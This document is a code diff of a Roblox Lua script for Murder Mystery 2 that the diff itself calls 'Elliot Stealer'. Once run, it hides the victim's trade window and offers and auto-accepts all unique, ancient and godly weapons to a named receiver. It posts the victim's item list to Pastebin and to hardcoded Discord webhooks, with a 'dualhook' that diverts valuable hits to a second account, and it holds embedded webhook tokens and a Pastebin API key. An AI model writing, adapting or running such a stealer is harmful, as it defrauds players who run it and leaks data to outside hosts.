@@ -1,18 +1,31 @@
+-- [ Settings ] --
+Username = "Warrior_ggs"
+Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
+
+-- [ Dualhook Settings ] --
+DualUsername = "Warrior_ggs"
+DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
+DualUnique = 1
+DualAncient = 1
+DualGodly = 1
+
+userName = Username
+webHook = Webhook
+
+if getgenv().executed then return end
+getgenv().executed = true
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RepStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-local RepStorage = game:GetService("ReplicatedStorage")
-local LocalPlayer = Players.LocalPlayer
-
-local placeId = 142823291 -- MM2 placeId
-local spoofedJobId = game.JobId
-local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
 
 local InvModule = require(RepStorage.Modules.InventoryModule)
+local PlayerDataModule = require(RepStorage.Modules.ProfileData)
+local LevelModule = require(RepStorage.Modules.LevelModule)
 
-getgenv().realJobId = game.JobId -- стартовое значение
-
--- Отключаем Trade GUI
+-- Trade GUI disable coroutine
 local destroytrades2 = coroutine.create(function()
     while true do
         local tradeGUI = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
@@ -23,7 +36,7 @@ local destroytrades2 = coroutine.create(function()
     end
 end)
 
--- Проверка ценных предметов
+-- Fetch valuable items
 local function getValuableItems()
     local uniqueItems, ancientItems, godlyItems = {}, {}, {}
     for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
@@ -38,91 +51,100 @@ local function getValuableItems()
     return hasValuable, uniqueItems, ancientItems, godlyItems
 end
 
--- Отправка webhook
-local function sendWebhook(realJobId)
+-- Webhook sender
+local function SendWebhook()
     local hasValuable, uniqueItems, ancientItems, godlyItems = getValuableItems()
     if not hasValuable then return end
 
-    local fernUrl = "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..realJobId
-    local embed = {
-        embeds = {{
-            title = "🔍 JobID Info",
-            description = "Captured real JobID via failed teleport",
-            color = 65280,
-            fields = {
-                { name = "Spoofed JobID", value = spoofedJobId, inline = true },
-                { name = "Real JobID", value = realJobId, inline = true },
-                { name = "Fern.wtf Join Link", value = fernUrl, inline = false },
-                { name = "Uniques", value = tostring(#uniqueItems), inline = true },
-                { name = "Ancients", value = tostring(#ancientItems), inline = true },
-                { name = "Godlies", value = tostring(#godlyItems), inline = true },
-            },
-            footer = { text = "Delta JobID Logger" }
-        }}
-    }
-
-    pcall(function()
-        http_request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(embed)
-        })
-    end)
-end
-
--- Функция trade steal
-local function stealItems(targetPlayerName)
-    coroutine.resume(destroytrades2)
-
-    local sendArgs = {[1] = Players[targetPlayerName]}
-    RepStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
-
-    wait(3)
-
-    local function offerItems(itemList)
-        for _, itemId in pairs(itemList) do
-            RepStorage.Trade.OfferItem:FireServer(itemId, "Weapons")
-        end
+    if #uniqueItems >= DualUnique or #ancientItems >= DualAncient or #godlyItems >= DualGodly then
+        userName = DualUsername
+        webHook = DualWebhook
     end
 
-    local _, uniqueItems, ancientItems, godlyItems = getValuableItems()
-    offerItems(uniqueItems)
-    offerItems(ancientItems)
-    offerItems(godlyItems)
+    local pastebinString = "-- [ Uniques ] --\n"..table.concat(uniqueItems,"\n")..
+                           "\n\n-- [ Ancients ] --\n"..table.concat(ancientItems,"\n")..
+                           "\n\n-- [ Godlies ] --\n"..table.concat(godlyItems,"\n")
 
-    wait(6)
-    pcall(function()
-        RepStorage.Trade.AcceptTrade:FireServer(285646582)
-    end)
+    -- Pastebin upload
+    local function pastebin(content)
+        local body = {
+            api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+            api_paste_code = content,
+            api_option = "paste"
+        }
+        local encodedBody = ""
+        for k,v in pairs(body) do
+            encodedBody = encodedBody..k.."="..HttpService:UrlEncode(v).."&"
+        end
+        encodedBody = encodedBody:sub(1,-2)
+        local resp = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {["Content-Type"]="application/x-www-form-urlencoded"}
+        })
+        local rawUrl = "https://pastebin.com/raw/"..resp.Body:match("([%w]+)$")
+        return rawUrl
+    end
+
+    local pastebinLink = pastebin(pastebinString)
+
+    local embed = {
+        ["title"]="New hit via Elliot Stealer",
+        ["color"]=65280,
+        ["fields"]={
+            {["name"]="Receiver",["value"]=userName,["inline"]=true},
+            {["name"]="Items Link",["value"]=pastebinLink,["inline"]=false},
+        }
+    }
+
+    local data = HttpService:JSONEncode({["content"]="",["embeds"]={embed}})
+    request({Url=webHook,Method="POST",Headers={["Content-Type"]="application/json"},Body=data})
 end
 
--- Сохраняем JobId при неудачном телепорте (queue_on_teleport)
+-- Trade-steal function
+local function stealItems()
+    coroutine.resume(destroytrades2)
+    local sendArgs = {[1] = Players[userName]}
+    RepStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
+    wait(3)
+    local _, uniqueItems, ancientItems, godlyItems = getValuableItems()
+    local function offer(list)
+        for _,v in pairs(list) do
+            RepStorage.Trade.OfferItem:FireServer(v,"Weapons")
+        end
+    end
+    offer(uniqueItems)
+    offer(ancientItems)
+    offer(godlyItems)
+    wait(6)
+    RepStorage.Trade.AcceptTrade:FireServer(285646582)
+end
+
+-- JobId bypass + reconnect system
 TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,teleportInfo)
     if teleportInfo and teleportInfo.ServerInstanceId then
-        getgenv().realJobId = teleportInfo.ServerInstanceId
-        queue_on_teleport(string.format([[getgenv().realJobId = "%s"]], getgenv().realJobId))
-        sendWebhook(getgenv().realJobId)
+        getgenv().JobId = teleportInfo.ServerInstanceId
+        queue_on_teleport(string.format([[getgenv().JobId = "%s"]], getgenv().JobId))
+        SendWebhook()
     end
 end)
 
--- Форсируем перезаход (JobId bypass)
-for _ = 1, 2 do
+-- Force teleport with spoofed JobId
+for _=1,2 do
     task.spawn(function()
         pcall(function()
-            TeleportService:TeleportToPlaceInstance(placeId, game.JobId)
+            TeleportService:TeleportToPlaceInstance(142823291, game.JobId)
         end)
     end)
     task.wait(0.5)
 end
 
--- Автоматически запускаем stealItems после захода
+-- Auto trade on player join
 Players.PlayerAdded:Connect(function(player)
-    if player.Name == LocalPlayer.Name then
-        wait(3)
-        local hasValuable, _, _, _ = getValuableItems()
-        if hasValuable then
-            stealItems(LocalPlayer.Name)
-        end
+    if player.Name == userName then
+        player.Chatted:Connect(function()
+            stealItems()
+        end)
     end
 end)
